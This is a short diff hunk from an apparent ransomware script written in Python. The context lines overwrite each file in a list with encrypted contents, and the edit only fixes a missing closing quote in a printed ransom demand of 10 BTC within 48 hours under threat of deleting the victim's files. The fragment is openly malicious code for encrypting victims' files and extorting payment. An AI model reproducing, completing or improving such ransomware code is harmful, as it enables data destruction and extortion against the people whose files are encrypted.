@@ -34,4 +34,4 @@ for file in files:
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
 
-print("Give me 10BTC in 48H or I will delete all your files)
+print("Give me 10BTC in 48H or I will delete all your files")
